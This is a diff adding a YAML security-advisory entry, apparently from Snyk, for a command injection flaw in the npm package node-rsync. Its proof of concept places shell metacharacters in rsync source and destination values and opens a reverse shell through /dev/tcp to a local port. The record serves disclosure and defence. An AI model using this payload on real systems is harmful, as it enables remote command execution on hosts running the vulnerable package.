@@ -1,0 +1,26 @@
+---
+- id: snykio:npm:node-rsync:568773
+  title: Arbitrary Command Injection
+  description: "[node-rsync][1] is a Rsync wrapper for Node.js\n\nAffected versions
+    of this package are vulnerable to Arbitrary Command\nInjection. The issue occurs
+    because user input is formatted inside a\ncommand that will be executed without
+    any checks.\n\n### PoC By Snyk Security Team   {#poc-by-snyk-security-team}\n\n
+    \   // Build the command\n    var rsync = new Rsync()\n        .shell('ssh')\n
+    \       .flags('az')\n        .source(';/path/to/source')\n        .destination('&sh</dev/tcp/127.0.0.1/4444');\n
+    \   \n    // Execute the command\n    rsync.execute(function (error, code, cmd)
+    {\n        console.log(cmd)\n    });\n\n\n\n[1]: https://www.npmjs.com/package/node-rsync\n"
+  affected_package: node-rsync
+  vulnerable_versions:
+  - "*"
+  severity: high
+  package_manager: npm
+  cwe:
+  - CWE-78
+  disclosed_date: 2020-05-07
+  created_date: 2020-06-21
+  last_modified_date: 2020-06-21
+  credit:
+  - Mik317
+  references:
+  - https://github.com/mattijs/node-rsync/issues/69
+  source_url: https://snyk.io/vuln/SNYK-JS-NODERSYNC-568773
